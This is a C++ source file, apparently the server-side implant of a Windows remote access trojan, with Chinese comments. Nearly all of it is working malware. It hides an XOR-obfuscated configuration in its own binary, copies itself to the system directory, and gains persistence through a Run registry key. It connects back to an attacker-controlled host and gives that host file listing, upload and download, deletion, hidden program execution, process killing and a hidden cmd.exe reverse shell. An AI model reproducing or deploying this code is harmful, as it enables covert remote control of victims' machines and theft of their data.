// Server.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include "tiny.h"

typedef struct _MyComputerinfo {
	TCHAR		Myip[256];
	TCHAR		Myname[256];
} MyComputerinfo, * PMyComputerinfo;

typedef struct _MyCommand {
	UINT		CommandType;
	TCHAR		Parameter[256];
} MyCommand, * PMyCommand;

typedef struct _MyFileInfo {
	TCHAR       szFileName[256];                //文件名
	TCHAR		type[64];						//类型
	TCHAR		size[64];						//大小
	TCHAR		time[128];						//日期/时间
	BOOL		Next;							//还有下一个?
} MyFileInfo, * PMyFileInfo;

typedef struct tagFileInfo
{
	char filename[512];
	DWORD filesize;
}FILEINFO;


typedef struct _ProcessInfo {
	TCHAR		ProcName[256];
	UINT		PID;
	BOOL		Next;
} ProcessInfo, * PProcessInfo;

typedef struct _CmdResult {
	TCHAR		Buff[4096];
	UINT		Next;
} CmdResult, * PCmdResult;


char hostname[256];
char hostip[256];

char URL[256] = {0};
UINT PORT;
char ExeName[128] = {0};
char RegRun[128] = {0};

void jiemistr(char *a)
{
	int i;
	for(i=0;i<500;i++)
		a[i]=a[i]^1116;
}


BOOL getconfig()
{
	FILE *fp;
	char *m[6];
	char svBuffer[512],strtmp[500];
	char *p;
	int  i = 0;
	char *mySelf=new char[256];
	GetModuleFileName(NULL,mySelf,256);
	memset(svBuffer,0,512);
	if((fp = fopen(mySelf,"r")) == NULL)
		return 0;
	fseek(fp, -512, SEEK_END);
	fread(svBuffer, sizeof(char), 512, fp);
	fclose(fp);
	
	if(memcmp(svBuffer,"configserver",12)==0)
	{
		strncpy(svBuffer,svBuffer+12,strlen(svBuffer)-12);
		strncpy(strtmp,svBuffer,488);
		jiemistr(strtmp);

		p = strtok (strtmp,"$");
		while(p)
		{
		m[i]=p;
		if(p = strtok (NULL,"$"))
		i++;
		if(i==6) break;
		}
	}
	else return 0;

	free(svBuffer);
	memset( URL, 0, strlen(URL));
	strcpy( URL, m[0]);
	PORT = atoi(m[1]);
	strcpy( ExeName, m[2]);
	strcpy( RegRun, m[3]);
	return 1;
}

int SetRun(char *Regkey, char *pathexe)
{
	HKEY hkey;
	RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
	RegSetValueEx(hkey,( LPCTSTR )Regkey,0,REG_SZ,( const BYTE* ) ( LPCTSTR )pathexe,lstrlen(pathexe));
	RegCloseKey(hkey);
	return 0;
}

BOOL InitSocket()
{
	WSADATA lpWSAData;
	if(WSAStartup(MAKEWORD(1,1),&lpWSAData))
	{
		MessageBox(0,"无法初始化WinSocket,请检查TCP/IP设置","ERR",MB_OK);
		return FALSE;
	}
	return TRUE;
}

int GetLocalHostName(char *sHostName)
{

	char szHostName[256];
	int  nRetCode;
	nRetCode = gethostname(szHostName, sizeof(szHostName));
	if (nRetCode != 0)
	{
		return WSAGetLastError();
	}
	strcpy(sHostName,szHostName);
	return 0;
}

int GetIPAddress(const char *sHostName, char *sIPAddress)
{
	struct hostent FAR *lpHostEnt = gethostbyname (sHostName);

	if (lpHostEnt == NULL)
	{
		return WSAGetLastError();
	}

	LPSTR lpAddr = lpHostEnt->h_addr_list[0];
	if (lpAddr) 
	{
		struct in_addr  inAddr;
		memmove (&inAddr, lpAddr, 4);
		strcpy(sIPAddress,inet_ntoa (inAddr));
	}	
	return 0;
}

///////////////文件
void GetDriver(SOCKET s);
void ListFile(SOCKET s,char *path);
void RunProc(SOCKET s,char *path);
void DelFile(SOCKET s,char *path);
void DownFile(SOCKET s);
void UpFile(SOCKET s,char *path);

///////////////进程
void ListProc(SOCKET s);
void KillProc(SOCKET s,char *PID);

///////////////Cmd
HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;  
unsigned long lBytesRead; 

void CreateCmd(SOCKET s);
void CloseCmd(SOCKET s);
void RunCmd(SOCKET s,char *Cmd);

SOCKET sktClient;
struct sockaddr_in sockaddrin;
BOOL   EndProgram;



void TestConnect(SOCKET sock);

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	if(!getconfig())
		return 0;
	

	if(strcmp(RegRun,"null") != 0)
	{
		char mySelf[256]={0};
		char pathexe[256]={0};

		GetModuleFileName( NULL, mySelf, 256 );
		GetSystemDirectory( pathexe, 256 );
		strcat(pathexe,"\\");
		strcat(pathexe,ExeName);
		CopyFile(mySelf,pathexe,FALSE);
		SetRun(RegRun,pathexe);
	}


	InitSocket();

	int ret;

	const char *pszAddr;
	hostent FAR *hp;

	////获取本地ip和机器名
	MyComputerinfo mycomputerinfo;
	GetLocalHostName(hostname);
	GetIPAddress(hostname,hostip);

	strcpy(mycomputerinfo.Myip,hostip);
	strcpy(mycomputerinfo.Myname,hostname);

testconn:

	while(1)
	{
		while(!gethostbyname(URL))
		{
			Sleep(5000);
		}
		hp  =  gethostbyname(URL);
		pszAddr = inet_ntoa( *(struct in_addr *)hp->h_addr_list[0] );
		if(strcmp(pszAddr,"127.0.0.1")==0)
		{
			Sleep(5000);
		}
		else
			break;
	}

	sktClient=socket(AF_INET,SOCK_STREAM,0);
	if(sktClient==INVALID_SOCKET)
	{
		//MessageBox(0,"无法创建SOCKET","ERR",MB_OK);
		return FALSE;
	}

	sockaddrin.sin_family = AF_INET;
	sockaddrin.sin_port = htons(PORT);
	sockaddrin.sin_addr.s_addr = inet_addr(pszAddr);


	ret = connect(sktClient,(const struct sockaddr *)&sockaddrin,sizeof(sockaddrin));
	if(ret == SOCKET_ERROR)
	{
		closesocket(sktClient);
		Sleep(5000);
		goto testconn;
	}


	char cFlag[8] = "fxftest";
	char buf[8] = {0};
	send(sktClient,cFlag,strlen(cFlag),0);
	recv(sktClient,buf,8,0);
	if(strncmp(buf,cFlag,7))
	{
		return 0;
	}

	send(sktClient,(char *)&mycomputerinfo,sizeof(mycomputerinfo),0);
	//recv(sktClient,cFlag,7,0);
	//send(sktClient,cFlag,7,0);

	MyCommand mycommand;
	memset(&mycommand,0,sizeof(mycommand));


	while(!EndProgram)
	{
			
		ret = recv(sktClient,(char *)&mycommand,sizeof(_MyCommand),0);

		if ( ret <= 0)
		{
			break;
		}


		switch(mycommand.CommandType)
		{
			case 1:
				GetDriver(sktClient);
				//传送驱动器信息
				break;
			case 2:
				ListFile(sktClient,mycommand.Parameter);
				//列出目录
				break;
			case 3:
				//运行程序
				RunProc(sktClient,mycommand.Parameter);
				break;
			case 4:
				//删除文件
				DelFile(sktClient,mycommand.Parameter);
				break;
			case 5:
				//上传文件
				DownFile(sktClient);
				break;
			case 6:
				//下载文件
				UpFile(sktClient,mycommand.Parameter);
				break;
			case 7:
				ListProc(sktClient);
				//列进程
				break;
			case 8:
				//杀进程
				KillProc(sktClient,mycommand.Parameter);
				break;
			case 9:
				CreateCmd(sktClient);
				break;
			case 10:
				RunCmd(sktClient,mycommand.Parameter);
				break;
			case 11:
				CloseCmd(sktClient);	
				break;
			case 12:
				TestConnect(sktClient);
				break;
			}
		//Sleep(200);
		memset(&mycommand,0,sizeof(_MyCommand));
	}

	closesocket(sktClient);
	goto testconn;
	return 0;
}

void GetDriver(SOCKET s) 
{
		DWORD maskdriver;
		DWORD drivertype;
		char sendbuf[4];
		char senddriver[300]="#";
		char sdriver[10];
		int  count=0;
		int  iImage;
		if(!(maskdriver=GetLogicalDrives()))
		{
			return ;
		}
		for(int i=0;i<26;i++)
		{
			if(!(maskdriver>>i))
				break;
			if(maskdriver>>i&1)
			{
				sdriver[0]=i+'A';
				sdriver[1]=':';
				sdriver[2]=0;
				drivertype=GetDriveType(sdriver);
				if(drivertype==DRIVE_REMOVABLE)
				{
					iImage=0;
				}
				if(drivertype==DRIVE_FIXED)
				{
					iImage=1;
				}
				if(drivertype==DRIVE_CDROM)
				{
					iImage=2;
				}
				if(drivertype==DRIVE_REMOTE)
				{
					iImage=3;
				}
				
				sprintf(sendbuf,"%s%d",sdriver,iImage);
				strcat(senddriver,sendbuf);
				count++;				
			}
		}
		strcat(senddriver,"#");
		send(s,senddriver,256,0);
}

void ListFile(SOCKET s,char *path)
{
	HANDLE				hlocalfile;
	WIN32_FIND_DATA		findd;
	struct _MyFileInfo	fileinfo;
	DWORD				len;        //文件大小
	char				slen[128];  //文件大小 + "K"
	FILETIME			filetime;   
	SYSTEMTIME			time;
	char				stime[256]; //文件时间
	SHFILEINFO			shfi;

	char ret[2];

	memset(&findd,0,sizeof(findd));
	if((hlocalfile=FindFirstFile(path,&findd))==INVALID_HANDLE_VALUE)
	{
		send(s,"q",2,0);
		return;
	}
	else
		send(s,"o",2,0);
	
	memset(&shfi,0,sizeof(shfi));
	SHGetFileInfo(fileinfo.szFileName, 
			FILE_ATTRIBUTE_NORMAL, &shfi, sizeof(shfi),
			SHGFI_ICON|SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME );

	memset(&fileinfo,0,sizeof(fileinfo));
	fileinfo.Next = 1;
	if(strcmp(findd.cFileName,".")!=0&&strcmp(findd.cFileName,"..")!=0)
	{
		strcpy(fileinfo.szFileName,findd.cFileName);

		if(findd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			strcpy(fileinfo.type, "DIR");
		else
			strcpy(fileinfo.type, shfi.szTypeName);
	
		len=(findd.nFileSizeHigh*MAXDWORD+findd.nFileSizeLow)/1024;
		sprintf(slen,"%dK",len);

		if(findd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			strcpy(fileinfo.size, "");
		else
			strcpy(fileinfo.size, slen);
		
		filetime=findd.ftLastWriteTime;
		FileTimeToSystemTime(&filetime,&time);
		sprintf(stime,"%4d-%02d-%02d %02d:%02d:%02d",time.wYear,time.wMonth,time.wDay,time.wHour,time.wMinute,time.wSecond);
		strcpy(fileinfo.time, stime);

senddata:
		send(sktClient,(char*)&fileinfo,sizeof(_MyFileInfo),0);
		recv(sktClient,ret,2,0);
		if(atoi(ret)!=0)
			goto senddata; 
	}
	while(hlocalfile)
	{
		memset(&fileinfo,0,sizeof(fileinfo));
		if(FindNextFile(hlocalfile,&findd))
		{
			fileinfo.Next = 1;
			if(strcmp(findd.cFileName,".")!=0&&strcmp(findd.cFileName,"..")!=0)
			{
				memset(&shfi,0,sizeof(shfi));
				SHGetFileInfo(findd.cFileName, 
						FILE_ATTRIBUTE_NORMAL, &shfi, sizeof(shfi),
						SHGFI_ICON|SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME );
				
				strcpy(fileinfo.szFileName,findd.cFileName);

				if(findd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
					strcpy(fileinfo.type, "DIR");
				else
					strcpy(fileinfo.type, shfi.szTypeName);
	
				len=(findd.nFileSizeHigh*MAXDWORD+findd.nFileSizeLow)/1024;
				sprintf(slen,"%dK",len);
		
				if(findd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
					strcpy(fileinfo.size, "");
				else
					strcpy(fileinfo.size, slen);
			
				filetime=findd.ftLastWriteTime;
				FileTimeToSystemTime(&filetime,&time);
				sprintf(stime,"%4d-%02d-%02d %02d:%02d:%02d",time.wYear,time.wMonth,time.wDay,time.wHour,time.wMinute,time.wSecond);
				strcpy(fileinfo.time, stime);
senddata1:
				send(sktClient,(char*)&fileinfo,sizeof(_MyFileInfo),0);
				recv(sktClient,ret,2,0);
				if(atoi(ret)!=0)
					goto senddata1; 
			}
		}	
		else
		{
			if(GetLastError()==ERROR_NO_MORE_FILES)
				break;
		}
	}
	fileinfo.Next =0;
	send(sktClient,(char*)&fileinfo,sizeof(_MyFileInfo),0);
	FindClose(hlocalfile);
}

void RunProc(SOCKET s,char *path)
{
	int ret = WinExec(path,SW_HIDE);
	if(ret > 31)
		send(s,"0",2,0);
	else
		send(s,"1",2,0);
}

void DelFile(SOCKET s,char *path)
{
	if(DeleteFile(path))
		send(s,"0",2,0);
	else
		send(s,"1",2,0);
}

void DownFile(SOCKET s)
{
	FILEINFO fi;
	int ret;

	recv(s,(char *)&fi,sizeof(fi),0);

	HANDLE  hf = CreateFile(fi.filename,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if ( hf <= 0 )
	{
		send(s,"upfileer",9,0);
		return;
	}
	DWORD   Size = fi.filesize;

	while ( Size > 0 )
	{
		char fbuf[1024] = {0};
		ret = recv(s,fbuf,1024,0);

		if ( ret == -1 )
		{
			CloseHandle(hf);
			send(s,"upfileer",9,0);
			return;
		}
		else
		{
			Size-=ret;
			DWORD	A;
			if ( !WriteFile(hf,fbuf,ret,&A,NULL) )
			{
				send(s,"upfileer",9,0);
				return;
			}
		}			
	}
	CloseHandle(hf);

	send(s,"upfileok",9,0);
}


void UpFile(SOCKET s, char *path)
{
	HANDLE hFile,hMapping;
	char *basepointer = NULL;
	FILEINFO fi;
	if ((hFile = CreateFile(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0)) == INVALID_HANDLE_VALUE)
	{
		return;
	}
	if (!(hMapping = CreateFileMapping(hFile, 0, PAGE_READONLY | SEC_COMMIT, 0, 0, 0)))
	{
		CloseHandle(hFile);
		return;
	}

	if (!(basepointer = (char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)))
	{
		CloseHandle(hMapping);
		CloseHandle(hFile);
		return;
	}  //把文件映射到内存。

	fi.filesize = GetFileSize(hFile,NULL); //取得文件大小

	send(s,(char *)&fi,sizeof(fi),0);

	int i = send(s,basepointer,fi.filesize,0);

	if ( i == SOCKET_ERROR  )
	{
		UnmapViewOfFile(basepointer);
		CloseHandle(hMapping);
		CloseHandle(hFile);
		return;
	}
	UnmapViewOfFile(basepointer);
	CloseHandle(hMapping);
	CloseHandle(hFile);
}


void ListProc(SOCKET s)
{
	HANDLE hSnap32;
	PROCESSENTRY32 pe32;
	ProcessInfo pinfo;
	char ret[2];

	pe32.dwSize=sizeof(PROCESSENTRY32);
	hSnap32=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pinfo.Next = 1;
	if(::Process32First(hSnap32,&pe32))
	{
		do
		{
			//int iLen=strlen(pe32.szExeFile);
			strcpy(pinfo.ProcName,pe32.szExeFile);
			pinfo.PID = pe32.th32ProcessID;
sendproc:
			send(s,(char *)&pinfo,sizeof(pinfo),0);
			recv(s,ret,2,0);
			if(atoi(ret)!=0)
				goto sendproc;
		}while(::Process32Next(hSnap32,&pe32));
	}
	pinfo.Next = 0;
	send(s,(char *)&pinfo,sizeof(pinfo),0);
}

void KillProc(SOCKET s,char *PID)
{
	HANDLE process = OpenProcess(PROCESS_TERMINATE, 0, atoi(PID));
	if(TerminateProcess(process, (unsigned)-1))
		send(s,"0",2,0);
	else 
		send(s,"1",2,0);
}


void CreateCmd(SOCKET s)
{
	int ret = 1;
	CmdResult cmdresult;
	STARTUPINFO si;
	PROCESS_INFORMATION  pi;
	SECURITY_ATTRIBUTES sa;  
	sa.nLength=12;  
	sa.lpSecurityDescriptor=0;  
	sa.bInheritHandle=TRUE;  
	CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0);  
	CreatePipe(&hReadPipe2,&hWritePipe2,&sa,0); 
	char cmdLine[] = "cmd.exe";  
	ZeroMemory(&si,sizeof(si));  
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;  
	si.wShowWindow = SW_HIDE;  
	si.hStdInput = hReadPipe2;// 读取写入pipe2的数据  
	si.hStdOutput = si.hStdError = hWritePipe1;// 向这里写数据 
	// 创建一个cmd进程, 由hReadPipe2读数据,向hWritePipe1写数据  
	int bread = CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&pi);  
	Sleep(2000);

	cmdresult.Next = 1;

	while(1)
	{
		
		ret=PeekNamedPipe(hReadPipe1,cmdresult.Buff,512,&lBytesRead,0,0);
		//从管道中复制数据到缓冲区中
		if(lBytesRead<=0)
			break;
		if(lBytesRead)
		{
			ret = ReadFile(hReadPipe1,cmdresult.Buff,lBytesRead,&lBytesRead,NULL);
			if(!ret) break;
			cmdresult.Buff[lBytesRead++] = '\0';
			ret = send(s,(char *)&cmdresult,sizeof(cmdresult),0);
			if(ret <= 0)
				break;
		}
	}
	cmdresult.Next = 0;
	send(s,(char *)&cmdresult,sizeof(cmdresult),0);
}

void CloseCmd(SOCKET s)
{
	CloseHandle(hReadPipe1);
	CloseHandle(hWritePipe1);
	CloseHandle(hReadPipe2);
	CloseHandle(hWritePipe2);
	send(s,"q",2,0);
}

void RunCmd(SOCKET s, char *Cmd)
{
  	CmdResult cmdresult;
	int ret;
	int num=0;
	char buf[2];
	// 把从连接读到的数据写入hWritePipe
	//strcat(Cmd,"\r\n");
	lBytesRead = strlen(Cmd);

	ret = WriteFile(hWritePipe2,Cmd,lBytesRead,&lBytesRead,0);
	if(ret == 0)
	{
		return;
	}
	if(lBytesRead > 4 && Cmd[0]=='e' && Cmd[1]=='x' && Cmd[2]=='i' && Cmd[3]=='t')  
	{
		cmdresult.Next = 0;
		send(s,(char *)&cmdresult,sizeof(cmdresult),0);
		CloseCmd(s);
		return;
	}  

	cmdresult.Next = 1;
test:
	while(1)
	{
		ret=PeekNamedPipe(hReadPipe1,cmdresult.Buff,512,&lBytesRead,0,0);
		num++;
		if(num==20)
			goto over;
		if(lBytesRead>0)
		{
			num = 0;
			break;
		}
		Sleep(100);
	}

	while(1)
	{
		//从管道中复制数据到缓冲区中
		if(lBytesRead)
		{
			ret = ReadFile(hReadPipe1,cmdresult.Buff,lBytesRead,&lBytesRead,NULL);
			if(!ret) break;
			cmdresult.Buff[lBytesRead++] = '\0';
sendcmd:
			ret = send(s,(char *)&cmdresult,sizeof(cmdresult),0);
			if(ret <= 0)
				break;
			recv(s,buf,2,0);
			if(strcmp(buf,"o")!=0)
				goto sendcmd;
		}
		memset(&cmdresult,0,sizeof(cmdresult));
		cmdresult.Next = 1;
		ret=PeekNamedPipe(hReadPipe1,cmdresult.Buff,1024,&lBytesRead,0,0);
		if(lBytesRead<=0)
			goto test;
	}
over:
	cmdresult.Next = 0;
	send(s,(char *)&cmdresult,sizeof(cmdresult),0);
}


void TestConnect(SOCKET sock)
{
	char cFlag[8] = {0};
	recv(sock,cFlag,7,0);
	send(sock,cFlag,7,0);
	//MessageBox(0,"only test","test",MB_OK);
}